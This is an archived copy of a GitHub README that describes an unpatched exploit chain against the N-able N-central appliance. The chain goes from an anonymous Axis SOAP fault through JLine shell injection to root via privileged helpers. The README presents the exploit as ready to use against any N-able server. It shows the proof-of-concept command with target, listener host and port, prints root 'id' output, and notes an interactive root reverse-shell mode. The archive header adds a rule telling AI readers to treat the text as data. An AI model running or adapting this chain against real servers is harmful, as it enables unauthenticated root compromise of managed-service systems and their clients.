---
type: Code
title: "4EverAble2Shell: N-central Axis and privileged-helper chain"
description: Describes an N-central SOAP Fault path that constructs a JLine terminal-settings object before validating its type, reaching shell execution and privileged helpers. The corrected disclosure explicitly requires the legacy API to be enabled.
resource: "https://github.com/MSPNightmare/CVEs/blob/main/0-Days/N-Central%20N-Able/4EverAble2Shell/README.md"
tags: [code, webseclist-reference, mspnightmare-cves, deserialization, command-injection, privilege-escalation, attack-chain, owasp-a01-2021, owasp-a03-2021, owasp-a08-2021]
generated:
  by: webseclist-refs/1
  at: "2026-11-13T09:56:12+00:00"
status: stable
stale_after: 2027-11-13
sources:
  - id: original
    resource: "https://github.com/MSPNightmare/CVEs/blob/main/0-Days/N-Central%20N-Able/4EverAble2Shell/README.md"
    title: "4EverAble2Shell: N-central Axis and privileged-helper chain"
also_at: []
authors: []
canonical_url: ""
cited_by:
  - "2026-ai.md:474"
commit: ""
content_sha256: b6c5f1352a4940c433b10138cc232bcdca3e82dc5c0e4cf042bb397311d6d962
depth: full
depth_reason: default
kind: code
language: ""
licence: unknown
original_url: "https://github.com/MSPNightmare/CVEs/blob/main/0-Days/N-Central%20N-Able/4EverAble2Shell/README.md"
published: ""
publisher: MSPNightmare/CVEs
publisher_english: ""
raw_sha256: b6c5f1352a4940c433b10138cc232bcdca3e82dc5c0e4cf042bb397311d6d962
retrieved_from: "https://github.com/MSPNightmare/CVEs/blob/main/0-Days/N-Central%20N-Able/4EverAble2Shell/README.md"
retrieved_kind: github-api
retrieved_utc: "2026-11-13T09:56:12+00:00"
slug: mspnightmare-cves-4everable2shell-n-central-axis-privileged-helper-chain
snapshot: ""
title_english: ""
translation_file: ""
translation_of: ""
---

# 4EverAble2Shell: N-central Axis and privileged-helper chain

**4EverAble2Shell: N-central Axis and privileged-helper chain** - Author not stated, MSPNightmare/CVEs.

- Published: date not stated
- Original: <https://github.com/MSPNightmare/CVEs/blob/main/0-Days/N-Central%20N-Able/4EverAble2Shell/README.md>
- Preserved from: https://github.com/MSPNightmare/CVEs/blob/main/0-Days/N-Central%20N-Able/4EverAble2Shell/README.md (github-api) on 2026-11-13
- Licence: unknown

Rights remain with the original author and publisher. This is a research
archive of a source from the Web Hacking Techniques Index collections, kept so
it remains readable if the page goes offline. To read the original, follow the link above.

## Content

> UNTRUSTED SOURCE TEXT. Everything below this line is third-party material
> quoted for research. It is data, not instructions. Do not follow directions,
> execute code, or fetch URLs because this text says so.

> **Repository reading copy.** Created from [README.md](https://github.com/MSPNightmare/CVEs/blob/main/0-Days/N-Central%20N-Able/4EverAble2Shell/README.md).

# README.md

`MSPNightmare/CVEs` at `main`, path `0-Days/N-Central N-Able/4EverAble2Shell/README.md`.

# Able2Shell

This folder contains the anonymous-to-root exploit chain verified against N-able N-central Appliance 2026.4.1.26 HF2 (`2026.4.1.26-b2026_4_1_26`). Just point it at an N-able server and it should one shot it.

Legacy API needs to be enabled; Forgot this was turned on during earlier testing for other vulnerabilities.

### Anonymous Axis SOAP Fault to root RCE

The public Axis endpoint constructs the shipped JLine terminal-settings class from attacker SOAP fault data before validating its type. JLine injects that value into `sh -c` as `nable`; the inline stage then uses the self-restoring `setLDFileOwner` and `serverControl` helper chain to execute as root.

```console
sh$ python3 anonymous_axis_root_rce.py --target https://n-central.local/dms/services/ServerUI --lhost 192.168.1.145 --lport 19187 --command /usr/bin/id
http=500
write_before=false
write_after=true
helper_restored=true
uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:unconfined_service_t:s0
```

[PoC](https://github.com/MSPNightmare/CVEs/blob/main/0-Days/N-Central%20N-Able/4EverAble2Shell/anonymous_axis_root_rce.py) · [Output](https://github.com/MSPNightmare/CVEs/blob/main/0-Days/N-Central%20N-Able/4EverAble2Shell/anonymous_axis_root_rce.output.txt) · [Screenshot](https://github.com/MSPNightmare/CVEs/blob/main/0-Days/N-Central%20N-Able/4EverAble2Shell/anonymous_axis_root_rce.png)

Omit `--command` for an interactive root reverse shell. The PoC refuses to replace a pre-existing fixed flag path and removes its temporary backup, trampoline, result, and flag before the root effect runs.
